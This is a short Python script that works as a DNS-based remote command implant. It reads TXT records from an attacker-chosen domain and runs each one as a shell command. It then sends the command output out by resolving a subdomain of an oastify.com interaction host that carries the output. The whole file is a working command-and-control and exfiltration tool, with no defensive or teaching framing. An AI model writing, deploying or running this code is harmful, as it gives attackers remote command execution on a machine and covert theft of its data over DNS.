import sys
import subprocess
import re

def run_system_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error executing system command: {e}")
        return None
    except Exception as e:
        print(f"An error occurred while executing system command: {e}")
        return None

def query_txt_records(domain):
    try:
        # Run nslookup command to query TXT records for the domain
        result = subprocess.run(["nslookup", "-type=TXT", domain], capture_output=True, text=True)

        # Check if the command executed successfully
        if result.returncode == 0:
            # Extract strings after "text = " using regex
            txt_records = re.findall(r'text = "(.*)"', result.stdout)

            if txt_records:
                print("TXT records for", domain)
                for record in txt_records:
                    print(record)
                    # Run system-level command using the extracted string
                    command_output = run_system_command(record)
                    if command_output:
                        subdomain = f"{command_output}.oiac064epaxehvjw9pxx5tu01r7ivamyb.oastify.com"
                        print("Subdomain:", subdomain)
                        run_dns_lookup(subdomain)
            else:
                print(f"No TXT records found for {domain}")
        else:
            print(f"Error executing nslookup command: {result.stderr}")
            
    except Exception as e:
        print(f"An error occurred: {e}")

def run_dns_lookup(subdomain):
    try:
        result = subprocess.run(["nslookup", subdomain], capture_output=True, text=True)
        if result.returncode == 0:
            print("DNS lookup result for", subdomain)
            print(result.stdout)
        else:
            print(f"Error executing nslookup command for subdomain {subdomain}")
    except Exception as e:
        print(f"An error occurred while executing DNS lookup: {e}")

def main():
    # Check if a domain is provided as a command-line argument
    if len(sys.argv) != 2:
        print("Usage: python script.py <domain>")
        return

    domain = sys.argv[1]
    query_txt_records(domain)

if __name__ == "__main__":
    main()

